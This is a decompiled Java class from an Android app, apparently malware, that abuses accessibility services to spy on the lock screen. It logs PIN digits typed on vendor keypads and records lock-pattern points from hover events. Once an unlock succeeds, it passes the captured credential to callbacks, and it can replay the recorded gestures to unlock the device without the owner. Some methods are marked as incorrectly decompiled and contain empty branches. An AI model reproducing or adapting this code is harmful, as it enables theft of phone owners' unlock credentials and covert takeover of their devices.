package com.storm.safe.rock.service.modules;

import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.Random;
import kotlin.AbstractC0767a0;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.b30;
import p000.c30;
import p000.d30;
import p000.e30;
import p000.h10;
import p000.l10;
import p000.md0;
import p000.p21;
import p000.t60;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.a4 */
/* loaded from: classes2.dex */
public final class C0319a4 {

    /* renamed from: c2 */
    public static final d30 f53053c2 = new d30(null);

    /* renamed from: a0 */
    public final dqtvuisjd f53054a0;

    /* renamed from: a1 */
    public final dqtvuisjd f53055a1;

    /* renamed from: a2 */
    public boolean f53056a2;

    /* renamed from: a5 */
    public volatile boolean f53059a5;

    /* renamed from: a6 */
    public volatile boolean f53060a6;

    /* renamed from: a7 */
    public int f53061a7;

    /* renamed from: a9 */
    public boolean f53063a9;

    /* renamed from: b0 */
    public long f53064b0;

    /* renamed from: b3 */
    public h10 f53067b3;

    /* renamed from: b4 */
    public h10 f53068b4;

    /* renamed from: b5 */
    public l10 f53069b5;

    /* renamed from: b7 */
    public boolean f53071b7;

    /* renamed from: b8 */
    public String f53072b8;

    /* renamed from: b9 */
    public boolean f53073b9;

    /* renamed from: a3 */
    public JSONArray f53057a3 = new JSONArray();

    /* renamed from: a4 */
    public JSONArray f53058a4 = new JSONArray();

    /* renamed from: a8 */
    public final boolean f53062a8 = true;

    /* renamed from: b1 */
    public final y90 f53065b1 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.GestureRecorderManager$prefs$2
        {
            super(0);
        }

        @Override // p000.w00
        public final Object invoke() {
            return this.f52773a0.f53054a0.getSharedPreferences(C0319a4.f53053c2.getPREF_NAME(), 0);
        }
    });

    /* renamed from: b2 */
    public final Handler f53066b2 = new Handler(Looper.getMainLooper());

    /* renamed from: b6 */
    public final StringBuilder f53070b6 = new StringBuilder();

    /* renamed from: c0 */
    public final ArrayList f53074c0 = new ArrayList();

    /* renamed from: c1 */
    public final JSONArray f53075c1 = new JSONArray();

    public C0319a4(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2) {
        this.f53054a0 = dqtvuisjdVar;
        this.f53055a1 = dqtvuisjdVar2;
    }

    /* renamed from: a2 */
    public static AccessibilityNodeInfo m211571a2(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        AccessibilityNodeInfo accessibilityNodeInfoM211571a2;
        if (accessibilityNodeInfo == null) {
            return null;
        }
        if (t60.m214686a2(accessibilityNodeInfo.getViewIdResourceName(), str)) {
            return accessibilityNodeInfo;
        }
        try {
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null && (accessibilityNodeInfoM211571a2 = m211571a2(child, str)) != null) {
                    return accessibilityNodeInfoM211571a2;
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: a0 */
    public final void m211572a0() {
        if (this.f53060a6) {
            this.f53060a6 = false;
            this.f53066b2.post(new b30(this, 0));
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:30:0x00c2  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x00c8  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x00d6 A[Catch: Exception -> 0x0067, TryCatch #2 {Exception -> 0x0067, blocks: (B:6:0x0022, B:8:0x0047, B:12:0x006a, B:28:0x00a7, B:34:0x00ca, B:36:0x00d6, B:42:0x00f4, B:45:0x0106, B:49:0x0117, B:55:0x013c, B:54:0x012b, B:16:0x007f, B:27:0x00a1), top: B:63:0x0022 }] */
    /* JADX WARN: Removed duplicated region for block: B:45:0x0106 A[Catch: Exception -> 0x0067, TryCatch #2 {Exception -> 0x0067, blocks: (B:6:0x0022, B:8:0x0047, B:12:0x006a, B:28:0x00a7, B:34:0x00ca, B:36:0x00d6, B:42:0x00f4, B:45:0x0106, B:49:0x0117, B:55:0x013c, B:54:0x012b, B:16:0x007f, B:27:0x00a1), top: B:63:0x0022 }] */
    /* JADX WARN: Removed duplicated region for block: B:51:0x0126  */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211573a1(int i, JSONArray jSONArray) throws Resources.NotFoundException {
        long j;
        int dimensionPixelSize;
        float fOptInt;
        float fOptInt2;
        int length;
        int i2;
        long jMax;
        int length2 = jSONArray.length();
        Handler handler = this.f53066b2;
        if (i >= length2) {
            handler.postDelayed(new b30(this, 3), 100L);
            return;
        }
        try {
            JSONObject jSONObject = jSONArray.getJSONObject(i);
            JSONArray jSONArray2 = jSONObject.getJSONArray("points");
            long jOptLong = jSONObject.optLong("duration", 50L);
            long jOptLong2 = jSONObject.optLong("delayAfter", 100L);
            jSONObject.optLong("startDelay", 40L);
            if (jSONArray2.length() == 0) {
                t60.m214726f4("GestureRecorderManager", "⚠️ 手势 " + (i + 1) + " 没有点，跳过");
                handler.postDelayed(new c30(this, jSONArray, i, 0), 50L);
                return;
            }
            boolean zM214686a2 = t60.m214686a2(jSONObject.optString("type", ""), "pattern");
            if (!zM214686a2) {
                dqtvuisjd dqtvuisjdVar = this.f53054a0;
                try {
                    j = 40;
                } catch (Exception e) {
                    e = e;
                    j = 40;
                }
                try {
                    int identifier = dqtvuisjdVar.getResources().getIdentifier("status_bar_height", "dimen", "android");
                    if (identifier > 0) {
                        dimensionPixelSize = dqtvuisjdVar.getResources().getDimensionPixelSize(identifier);
                    }
                } catch (Exception e2) {
                    e = e2;
                    t60.m214705c6("GestureRecorderManager", "获取状态栏高度失败", e);
                    dimensionPixelSize = 0;
                    Path path = new Path();
                    JSONObject jSONObject2 = jSONArray2.getJSONObject(0);
                    fOptInt = jSONObject2.optInt("x", 1);
                    fOptInt2 = jSONObject2.optInt("y", 1);
                    float f = 0.0f;
                    if (fOptInt < 0.0f) {
                    }
                    if (fOptInt2 < 0.0f) {
                    }
                    float f2 = dimensionPixelSize;
                    path.moveTo(fOptInt, fOptInt2 + f2);
                    length = jSONArray2.length();
                    i2 = 1;
                    while (i2 < length) {
                    }
                    long jNextInt = 1;
                    if (zM214686a2) {
                    }
                    this.f53055a1.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, jNextInt, jMax)).build(), new e30(jOptLong2, this, jSONArray, i), null);
                }
                Path path2 = new Path();
                JSONObject jSONObject22 = jSONArray2.getJSONObject(0);
                fOptInt = jSONObject22.optInt("x", 1);
                fOptInt2 = jSONObject22.optInt("y", 1);
                float f3 = 0.0f;
                if (fOptInt < 0.0f) {
                    fOptInt = 1.0f;
                }
                if (fOptInt2 < 0.0f) {
                    fOptInt2 = 1.0f;
                }
                float f22 = dimensionPixelSize;
                path2.moveTo(fOptInt, fOptInt2 + f22);
                length = jSONArray2.length();
                i2 = 1;
                while (i2 < length) {
                    float f4 = f3;
                    JSONObject jSONObject3 = jSONArray2.getJSONObject(i2);
                    float f5 = f22;
                    float fOptInt3 = jSONObject3.optInt("x", 1);
                    float fOptInt4 = jSONObject3.optInt("y", 1);
                    if (fOptInt3 < f4) {
                        fOptInt3 = 1.0f;
                    }
                    if (fOptInt4 < f4) {
                        fOptInt4 = 1.0f;
                    }
                    path2.lineTo(fOptInt3, fOptInt4 + f5);
                    i2++;
                    f3 = f4;
                    f22 = f5;
                }
                long jNextInt2 = 1;
                if (zM214686a2) {
                    jMax = Math.max(1000L, Math.max(jOptLong <= 0 ? 1L : jOptLong, (jSONArray2.length() - 1) * 180));
                } else {
                    if (jOptLong <= 0) {
                        jOptLong = 1;
                    }
                    jNextInt2 = new Random().nextInt(20) + j;
                    jMax = jOptLong;
                }
                this.f53055a1.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path2, jNextInt2, jMax)).build(), new e30(jOptLong2, this, jSONArray, i), null);
            }
            j = 40;
            dimensionPixelSize = 0;
            Path path22 = new Path();
            JSONObject jSONObject222 = jSONArray2.getJSONObject(0);
            fOptInt = jSONObject222.optInt("x", 1);
            fOptInt2 = jSONObject222.optInt("y", 1);
            float f32 = 0.0f;
            if (fOptInt < 0.0f) {
            }
            if (fOptInt2 < 0.0f) {
            }
            float f222 = dimensionPixelSize;
            path22.moveTo(fOptInt, fOptInt2 + f222);
            length = jSONArray2.length();
            i2 = 1;
            while (i2 < length) {
            }
            long jNextInt22 = 1;
            if (zM214686a2) {
            }
            this.f53055a1.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path22, jNextInt22, jMax)).build(), new e30(jOptLong2, this, jSONArray, i), null);
        } catch (Exception e3) {
            t60.m214705c6("GestureRecorderManager", "❌ 执行手势 " + i + " 失败", e3);
            handler.postDelayed(new c30(this, jSONArray, i, 1), 100L);
        }
    }

    /* renamed from: a3 */
    public final void m211574a3(AccessibilityEvent accessibilityEvent) {
        t60.m214726f4("GestureRecorderManager", "🔍 [HOVER-DEBUG] onHoverEvent 被调用! pkg=" + ((Object) accessibilityEvent.getPackageName()) + " class=" + ((Object) accessibilityEvent.getClassName()));
        if (this.f53059a5) {
            t60.m214726f4("GestureRecorderManager", "🔍 [HOVER-DEBUG] ❌ isPlayingBack=true, 跳过");
            return;
        }
        boolean z = this.f53056a2;
        if (!z || this.f53061a7 != 1) {
            t60.m214726f4("GestureRecorderManager", "🔍 [HOVER-DEBUG] ❌ isRecording=" + z + ", mode=" + this.f53061a7 + ", 跳过");
            return;
        }
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        if (source == null) {
            t60.m214726f4("GestureRecorderManager", "🔍 [HOVER-DEBUG] ❌ event.source=null, 跳过");
            return;
        }
        try {
            CharSequence contentDescription = source.getContentDescription();
            Integer numM213685d8 = null;
            String string = contentDescription != null ? contentDescription.toString() : null;
            if (string == null) {
                t60.m214726f4("GestureRecorderManager", "🔍 [HOVER-DEBUG] ❌ contentDesc=null, viewId=" + source.getViewIdResourceName() + ", class=" + ((Object) source.getClassName()));
                return;
            }
            md0 md0VarM213645a0 = new Regex("\\d+").m213645a0(string);
            if (md0VarM213645a0 != null) {
                String strGroup = md0VarM213645a0.f58332a0.group();
                t60.m214694b5(strGroup, "matchResult.group()");
                numM213685d8 = AbstractC0779a1.m213685d8(strGroup);
            }
            if (numM213685d8 == null) {
                t60.m214726f4("GestureRecorderManager", "🔍 [HOVER-DEBUG] ❌ 无法提取编号, desc=".concat(string));
                return;
            }
            String str = "pt:" + numM213685d8;
            if (this.f53074c0.contains(str)) {
                return;
            }
            if (this.f53075c1.length() == 0) {
                System.currentTimeMillis();
            }
            Rect rect = new Rect();
            source.getBoundsInScreen(rect);
            this.f53074c0.add(str);
            int iIntValue = numM213685d8.intValue() - 1;
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("x", rect.centerX());
            jSONObject.put("y", rect.centerY());
            jSONObject.put("left", rect.left);
            jSONObject.put("top", rect.top);
            jSONObject.put("right", rect.right);
            jSONObject.put("bottom", rect.bottom);
            jSONObject.put("des", string);
            jSONObject.put("pos", iIntValue);
            this.f53075c1.put(jSONObject);
            t60.m214702c3("GestureRecorderManager", "🔐 HOVER图案点: pos=" + iIntValue + " @ (" + rect.centerX() + "," + rect.centerY() + ")  序列=" + this.f53074c0.size() + "点");
        } catch (Exception e) {
            t60.m214705c6("GestureRecorderManager", "❌ onHoverEvent处理失败", e);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:42:0x007d  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x00cd  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211575a4(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        String string;
        AccessibilityNodeInfo source;
        String strM213684d7;
        boolean z;
        String string2;
        if (this.f53059a5 || !this.f53056a2 || this.f53061a7 != 1 || (packageName = accessibilityEvent.getPackageName()) == null || (string = packageName.toString()) == null) {
            return;
        }
        if ((string.equals("com.android.systemui") || string.equals("com.android.keyguard")) && accessibilityEvent.getEventType() == 1 && (source = accessibilityEvent.getSource()) != null) {
            String viewIdResourceName = source.getViewIdResourceName();
            String str = "";
            if (viewIdResourceName == null) {
                viewIdResourceName = "";
            }
            CharSequence contentDescription = source.getContentDescription();
            if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                str = string2;
            }
            if (!AbstractC0779a1.m213652a5(viewIdResourceName, ":id/key", false) || AbstractC0779a1.m213652a5(viewIdResourceName, "VivoPinkey", false)) {
                strM213684d7 = null;
            } else {
                strM213684d7 = AbstractC0779a1.m213684d7(viewIdResourceName, "key");
                if (!new Regex("\\d").m213646a2(strM213684d7)) {
                }
            }
            if (strM213684d7 == null && AbstractC0779a1.m213652a5(viewIdResourceName, ":id/VivoPinkey", false)) {
                String strM213684d72 = AbstractC0779a1.m213684d7(viewIdResourceName, "VivoPinkey");
                if (new Regex("\\d").m213646a2(strM213684d72)) {
                    strM213684d7 = strM213684d72;
                }
            }
            if (strM213684d7 == null && AbstractC0779a1.m213652a5(viewIdResourceName, ":id/num", false)) {
                String strM213684d73 = AbstractC0779a1.m213684d7(viewIdResourceName, "num");
                if (new Regex("\\d").m213646a2(strM213684d73)) {
                    strM213684d7 = strM213684d73;
                }
            }
            if (strM213684d7 == null && AbstractC0779a1.m213652a5(viewIdResourceName, ":id/char_", false)) {
                String strM213684d74 = AbstractC0779a1.m213684d7(viewIdResourceName, "char_");
                if (strM213684d74.length() == 1) {
                    strM213684d7 = strM213684d74;
                    z = true;
                }
            } else {
                z = false;
            }
            if (strM213684d7 != null || str.length() != 1 || !new Regex("\\d").m213646a2(str)) {
                str = strM213684d7;
            }
            if (str != null) {
                this.f53070b6.append(str);
                if (z) {
                    this.f53071b7 = true;
                }
                t60.m214702c3("GestureRecorderManager", "🔢 锁屏PIN捕获按键: " + str + " (已输入 " + this.f53070b6.length() + " 位)");
            }
            if ((AbstractC0779a1.m213652a5(viewIdResourceName, "enter", false) || AbstractC0779a1.m213652a5(viewIdResourceName, "confirm", false) || AbstractC0779a1.m213652a5(viewIdResourceName, "iv_complete", false) || AbstractC0779a1.m213652a5(viewIdResourceName, "mix_confirm", false) || AbstractC0779a1.m213652a5(viewIdResourceName, "vivo_pin_confirm", false) || AbstractC0779a1.m213652a5(viewIdResourceName, "mix_normal_confirm", false) || AbstractC0779a1.m213652a5(viewIdResourceName, "btn_letter_ok", false)) && this.f53070b6.length() >= 4) {
                String string3 = this.f53070b6.toString();
                t60.m214694b5(string3, "capturedPinDigits.toString()");
                boolean z2 = this.f53071b7;
                t60.m214714d6("GestureRecorderManager", "✅ 锁屏PIN确认键按下: 长度=" + string3.length() + ", mixed=" + z2 + " (等待解锁成功后上报)");
                this.f53072b8 = string3;
                this.f53073b9 = z2;
                p21.m214238a3(this.f53070b6);
                this.f53071b7 = false;
            }
        }
    }

    /* renamed from: a5 */
    public final void m211576a5() {
        if (this.f53056a2 && this.f53061a7 == 1) {
            t60.m214702c3("GestureRecorderManager", "🔐 SCREEN_OFF → 取消未完成的图案录制，关闭触摸探索");
            if (this.f53056a2) {
                m211572a0();
                this.f53056a2 = false;
                this.f53061a7 = 0;
                this.f53057a3 = new JSONArray();
                this.f53058a4 = new JSONArray();
                ArrayList arrayList = this.f53074c0;
                arrayList.isEmpty();
                arrayList.clear();
                while (true) {
                    JSONArray jSONArray = this.f53075c1;
                    if (jSONArray.length() <= 0) {
                        break;
                    } else {
                        jSONArray.remove(0);
                    }
                }
                p21.m214238a3(this.f53070b6);
                this.f53071b7 = false;
                this.f53072b8 = null;
                this.f53073b9 = false;
            }
        } else {
            m211572a0();
        }
        this.f53063a9 = false;
    }

    /* JADX WARN: Removed duplicated region for block: B:110:0x025d  */
    /* JADX WARN: Removed duplicated region for block: B:115:0x02c5  */
    /* JADX WARN: Removed duplicated region for block: B:117:0x02d1  */
    /* JADX WARN: Removed duplicated region for block: B:128:0x02ea  */
    /* JADX WARN: Removed duplicated region for block: B:135:0x0320  */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211577a6() {
        StringBuilder sb;
        String string;
        boolean z;
        l10 l10Var;
        if (!this.f53062a8) {
            t60.m214726f4("GestureRecorderManager", "🔐 自动录制未启用，跳过");
            return;
        }
        String str = Build.MANUFACTURER;
        t60.m214694b5(str, "MANUFACTURER");
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        if (!AbstractC0779a1.m213652a5(lowerCase, "oppo", false) && !AbstractC0779a1.m213652a5(lowerCase, "realme", false)) {
            if (AbstractC0779a1.m213652a5(lowerCase, "oneplus", false)) {
                if (Build.VERSION.SDK_INT >= 31) {
                    t60.m214726f4("GestureRecorderManager", "🔐 当前品牌不支持图案录制");
                    return;
                }
            } else if (!AbstractC0779a1.m213652a5(lowerCase, "huawei", false) && !AbstractC0779a1.m213652a5(lowerCase, "honor", false) && !AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) && !AbstractC0779a1.m213652a5(lowerCase, "redmi", false) && !AbstractC0779a1.m213652a5(lowerCase, "vivo", false) && !AbstractC0779a1.m213652a5(lowerCase, "samsung", false)) {
                t60.m214726f4("GestureRecorderManager", "⚠️ 未知品牌: " + lowerCase + "，尝试支持");
            }
        }
        Object systemService = this.f53054a0.getSystemService("keyguard");
        KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
        if (keyguardManager == null || !keyguardManager.isKeyguardSecure()) {
            return;
        }
        boolean z2 = keyguardManager.isKeyguardLocked();
        boolean z3 = z2 && !this.f53063a9;
        boolean z4 = !z2 && this.f53063a9;
        y90 y90Var = this.f53065b1;
        StringBuilder sb2 = this.f53070b6;
        ArrayList arrayList = this.f53074c0;
        JSONArray jSONArray = this.f53075c1;
        if (z3) {
            if (!((SharedPreferences) y90Var.getValue()).getBoolean("has_recorded_unlock", false)) {
                this.f53061a7 = 1;
                this.f53064b0 = System.currentTimeMillis();
                this.f53056a2 = true;
                this.f53057a3 = new JSONArray();
                this.f53058a4 = new JSONArray();
                arrayList.clear();
                while (jSONArray.length() > 0) {
                    jSONArray.remove(0);
                }
                p21.m214238a3(sb2);
                this.f53071b7 = false;
                this.f53072b8 = null;
                this.f53073b9 = false;
            }
        } else if (z4 && this.f53056a2 && this.f53061a7 == 1) {
            m211572a0();
            long jCurrentTimeMillis = System.currentTimeMillis() - this.f53064b0;
            t60.m214726f4("GestureRecorderManager", "🔍 [HOVER-DEBUG] stopAutoRecording: duration=" + jCurrentTimeMillis + "ms, patternPoints=" + jSONArray.length() + ", patternList=" + arrayList.size() + ", recordedGestures=" + this.f53057a3.length() + ", pin=" + sb2.length() + "chars, pendingPin=" + (this.f53072b8 != null));
            if (jSONArray.length() < 4) {
                sb = sb2;
                this.f53056a2 = false;
                this.f53061a7 = 0;
                if (jCurrentTimeMillis <= 500 || this.f53057a3.length() <= 0) {
                    this.f53057a3 = new JSONArray();
                    string = this.f53072b8;
                    if (string == null) {
                        string = sb.length() >= 4 ? sb.toString() : null;
                    }
                    z = !this.f53073b9 || this.f53071b7;
                    this.f53072b8 = null;
                    this.f53073b9 = false;
                    p21.m214238a3(sb);
                    this.f53071b7 = false;
                    if (string != null && string.length() >= 4) {
                        t60.m214714d6("GestureRecorderManager", "✅ 锁屏PIN解锁成功，提交捕获结果: 长度=" + string.length() + ", mixed=" + z);
                        l10Var = this.f53069b5;
                        if (l10Var != null) {
                            l10Var.invoke(string, Boolean.valueOf(z));
                        }
                    }
                } else {
                    ((SharedPreferences) y90Var.getValue()).edit().putBoolean("has_recorded_unlock", true).apply();
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("gestures", this.f53057a3);
                    jSONObject.put("texts", this.f53058a4);
                    jSONObject.put("timestamp", System.currentTimeMillis());
                    jSONObject.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
                    jSONObject.put("type", "unlock");
                    jSONObject.put("mode", "auto");
                    this.f53057a3 = new JSONArray();
                    h10 h10Var = this.f53068b4;
                    if (h10Var != null) {
                        h10Var.invoke(jSONObject);
                    }
                }
            } else if (jSONArray.length() < 4) {
                t60.m214726f4("GestureRecorderManager", "⚠️ 图案点数不足(" + jSONArray.length() + "<4)，不保存");
                arrayList.clear();
                while (jSONArray.length() > 0) {
                    jSONArray.remove(0);
                }
                sb = sb2;
                this.f53056a2 = false;
                this.f53061a7 = 0;
                if (jCurrentTimeMillis <= 500) {
                    this.f53057a3 = new JSONArray();
                    string = this.f53072b8;
                    if (string == null) {
                    }
                    if (this.f53073b9) {
                        this.f53072b8 = null;
                        this.f53073b9 = false;
                        p21.m214238a3(sb);
                        this.f53071b7 = false;
                        if (string != null) {
                            t60.m214714d6("GestureRecorderManager", "✅ 锁屏PIN解锁成功，提交捕获结果: 长度=" + string.length() + ", mixed=" + z);
                            l10Var = this.f53069b5;
                            if (l10Var != null) {
                            }
                        }
                    }
                }
            } else {
                StringBuilder sb3 = new StringBuilder();
                int length = jSONArray.length();
                int i = 0;
                while (i < length) {
                    sb3.append(jSONArray.getJSONObject(i).optString("pos", "?"));
                    i++;
                    length = length;
                    sb2 = sb2;
                }
                sb = sb2;
                try {
                    try {
                        JSONArray jSONArray2 = new JSONArray(jSONArray.toString());
                        JSONObject jSONObject2 = new JSONObject();
                        jSONObject2.put("type", "pattern");
                        jSONObject2.put("points", jSONArray2);
                        jSONObject2.put("pattern", sb3.toString());
                        jSONObject2.put("duration", (jSONArray2.length() * 100) + 200);
                        jSONObject2.put("timestamp", System.currentTimeMillis());
                        this.f53057a3.put(jSONObject2);
                        arrayList.clear();
                        while (jSONArray.length() > 0) {
                            jSONArray.remove(0);
                        }
                    } catch (Exception e) {
                        t60.m214705c6("GestureRecorderManager", "❌ 保存图案手势失败", e);
                        arrayList.clear();
                        while (jSONArray.length() > 0) {
                            jSONArray.remove(0);
                        }
                    }
                    this.f53056a2 = false;
                    this.f53061a7 = 0;
                    if (jCurrentTimeMillis <= 500) {
                    }
                } catch (Throwable th) {
                    arrayList.clear();
                    while (jSONArray.length() > 0) {
                        jSONArray.remove(0);
                    }
                    throw th;
                }
            }
        }
        this.f53063a9 = z2;
    }

    /* renamed from: a7 */
    public final void m211578a7(JSONObject jSONObject) {
        try {
            JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray("gestures");
            if (jSONArrayOptJSONArray == null) {
                return;
            }
            if (jSONArrayOptJSONArray.length() == 0) {
                t60.m214726f4("GestureRecorderManager", "⚠️ 没有手势可回放");
            } else {
                this.f53059a5 = true;
                m211573a1(0, jSONArrayOptJSONArray);
            }
        } catch (Exception e) {
            t60.m214705c6("GestureRecorderManager", "❌ 回放手势失败", e);
            this.f53059a5 = false;
        }
    }
}
